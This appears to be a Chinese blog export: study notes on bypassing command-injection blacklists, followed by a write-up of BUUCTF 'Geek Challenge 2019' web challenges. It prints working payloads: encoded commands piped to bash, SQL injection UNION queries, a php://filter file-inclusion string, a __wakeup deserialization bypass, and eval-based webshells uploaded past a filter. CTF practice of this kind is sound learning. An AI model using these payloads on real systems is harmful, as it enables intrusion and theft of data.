<h3 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h3><p><code>IFS</code> 是一种set变量， 当shell处理**’命令替换’<strong>和</strong>‘参数替换’**，shell根据IFS的值，默认是 <code>space， tab， newline</code> 来拆解读入的变量， 然后对特殊字符进行处理， 最后重新组合赋值给变量。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat$IFS./flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%20</span><br><span class="line">+</span><br><span class="line">%09(tab)</span><br><span class="line">%3c(&lt;)</span><br></pre></td></tr></table></figure></div>

<h3 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ x=$&#x27;cat\x20./flag&#x27;&amp;&amp;$x</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ x=$&#x27;cat\x09./flag&#x27;&amp;&amp;$x</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h3 id="空变量"><a href="#空变量" class="headerlink" title="空变量"></a>空变量</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ca$@t ./flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ ca$1t ./fl$1ag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="变量替换"><a href="#变量替换" class="headerlink" title="变量替换"></a>变量替换</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ a=c; b=at; c=flag; $a$b $c</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo &quot;Y2F0IC4vZmxhZw==&quot;|base64 -d|bash</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ echo &quot;636174202e2f666c6167&quot; | xxd -r -p|bash  #hex</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ $(printf &quot;\x63\x61\x74\x20\x2e\x2f\x66\x6c\x61\x67&quot;)</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ c&quot;a&quot;t .&#x27;/f&#x27;l&#x27;a&#x27;g&#x27;</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ c\at fl\ag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用已有资源与字符-最后一部分没怎么搞懂"><a href="#利用已有资源与字符-最后一部分没怎么搞懂" class="headerlink" title="利用已有资源与字符(最后一部分没怎么搞懂)"></a>利用已有资源与字符(最后一部分没怎么搞懂)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">$ echo $PATH|cut -c 1</span><br><span class="line">/</span><br><span class="line">$ cat .`echo $PATH|cut -c 1`flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line"># 以下没怎么搞懂 我还要测一下</span><br><span class="line">$&#123;PS2&#125; 对应字符 &gt;</span><br><span class="line">$&#123;PS4&#125; 对应字符 + </span><br><span class="line">$&#123;IFS&#125; 对应 内部字段分隔符 </span><br><span class="line">$&#123;9&#125; 对应 空字符串</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>2019极客大挑战复现</title>
    <url>/yakko117/2020/01/19/%E5%A4%A7%E6%8C%91%E6%88%982019/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://buuoj.cn/challenges">极客大挑战 2019题目链接</a></p>
<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>行吧</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure></div>

<p>然后是官方的Payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin/admin<span class="string">&#x27;||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>源码存在hint，emmmmm 这复现md突然不想做了</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Payload：</span><br><span class="line">cat = dog</span><br></pre></td></tr></table></figure></div>

<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>查看源码，存在 <code>./Archive_room.php</code>，然后回显 <code>Secret</code> </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0z9444j30q40f7dg3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0z9444j30q40f7dg3.jpg" class="lazyload"></a></p>
<p>点进去跳转到 <code>end.php</code> ，抓包发现新的 <code>secr3t.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>熟悉的文件包含， <code>file 伪协议</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></div>

<p>得到的 <code>base64</code> 解码得到 flag</p>
<hr>
<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>题目说有良好的备份习惯，扫后台扫出了 <code>www.zip</code></p>
<p>拿到源码后，进行代码审计</p>
<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>我们需要绕过 <code>__wakeup魔法函数</code> 去执行 <code>__destruct()函数</code><br><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">参考文档绕过方法</a></p>
<p>我们在调用 <code>__destruct()函数</code> 后，想要成功获取flag还要两个条件</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username = admin;</span><br><span class="line">password = <span class="number">100</span>;</span><br></pre></td></tr></table></figure></div>


<p>而且题目中的 <code>username</code> 和 <code>password</code> 的值都是 <code>private</code><br>所以需要使用 <code>new Name</code> 去构造数值</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(a);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure></div>

<p>结果如下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0zau9tj30jk02egmr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb1x0zau9tj30jk02egmr.jpg" class="lazyload"></a></p>
<p>通过URL编码输出</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3a4%3a%22Name%22%3a2%3a%7bs%3a14%3a%22+Name+username%22%3bs%3a5%3a%22admin%22%3bs%3a14%3a%22+Name+password%22%3bi%3a100%3b%7d</span><br></pre></td></tr></table></figure></div>

<p>将加号修改成 <code>%00</code>，然后将输入的 <code>2</code> 改成 <code>3</code> 进行绕过<br><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>a4%<span class="number">3</span>a<span class="string">&quot;Name&quot;</span>%<span class="number">3</span>a4%<span class="number">3</span>a%<span class="number">7</span>bs%<span class="number">3</span>a14%<span class="number">3</span>a<span class="string">&quot;%00Name%00username&quot;</span>%<span class="number">3</span>bs%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">&quot;admin&quot;</span>%<span class="number">3</span>bs%<span class="number">3</span>a14%<span class="number">3</span>a<span class="string">&quot;%00Name%00password&quot;</span>%<span class="number">3</span>bi%<span class="number">3</span>a100%<span class="number">3</span>b%<span class="number">7</span>d</span><br></pre></td></tr></table></figure></div>

<p>Payload 提交后 返回 <code>flag</code></p>
<hr>
<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>又是白给shell的题</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval($_POST[&quot;Syc&quot;]);</span><br></pre></td></tr></table></figure></div>

<p>可以用菜刀直接连，然后找到 <code>flag</code></p>
<p>也可以直接利用一句话木马，直接进行命令执行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">Syc=system(&quot;ls -al /&quot;);</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhlv5gj30g40ghgnx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhlv5gj30g40ghgnx.jpg" class="lazyload"></a></p>
<p>然后得到 <code>flag</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syc=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>ok，熟悉的登陆界面，先试试简单的 <code>&#39;or 1=1#</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dc9yyj308h09s75x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dc9yyj308h09s75x.jpg" class="lazyload"></a></p>
<p>回显登陆成功，并且输出数据库中内容</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dchm7j30m20dy43j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413dchm7j30m20dy43j.jpg" class="lazyload"></a></p>
<p>尝试盲注，发现存在单引号包裹，字符型注入</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddn92j30vl0h4n1v.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddn92j30vl0h4n1v.jpg" class="lazyload"></a></p>
<p>用 <code>order by</code> 进行查询到4 报错了<br>说明有三个字段</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=admin%27+order+by+4%23&amp;password=admin</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413de8vwj30fx0g477o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413de8vwj30fx0g477o.jpg" class="lazyload"></a></p>
<p>然后用联合查询查到了数据库</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=admin%27 union+select+2,3,group_concat(schema_name)+from+information_schema.schemata%23</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddklaj30vq0a7q5z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413ddklaj30vq0a7q5z.jpg" class="lazyload"></a></p>
<p>查询数据表</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=admin%27+union+select+1%2C2%2Cgroup_concat(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase()+%23</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413deal4j30uf0a0ad1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413deal4j30uf0a0ad1.jpg" class="lazyload"></a></p>
<p>查询数据表中的列：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=admin%27%20union%20select%201%2C2%2Cgroup_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%3Ddatabase()%20%23</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413diqh1j30x10cytd9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb413diqh1j30x10cytd9.jpg" class="lazyload"></a></p>
<p>GET flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin&#x27;%20union%20select%201%2C2%2Cgroup_concat(password)%20from%20l0ve1ysq1%23</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhmo2jj30fd06040k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhmo2jj30fd06040k.jpg" class="lazyload"></a></p>
<p>题目大概是要搞个图片马，先随便试试过滤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhn0quj31540940vt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhn0quj31540940vt.jpg" class="lazyload"></a></p>
<p>回显说过滤了 <code>&lt;?</code>，那就尝试js 绕过</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhkryzj30zd06rwgq.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhkryzj30zd06rwgq.jpg" class="lazyload"></a></p>
<p>发现还有waf， 大概还有文件头验证</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhnlp8j315o0a1aea.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhnlp8j315o0a1aea.jpg" class="lazyload"></a></p>
<p>然后尝试绕过截断，被waf</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhpp5bj30h90560t1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhpp5bj30h90560t1.jpg" class="lazyload"></a></p>
<p>最后构造如下Payload</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhs8usj30xh053myl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhs8usj30xh053myl.jpg" class="lazyload"></a></p>
<p>菜刀连一下 <code>?hacker8.phtml</code>，得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhsnh6j30zk0jggoe.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gb3akhsnh6j30zk0jggoe.jpg" class="lazyload"></a></p>
<hr>
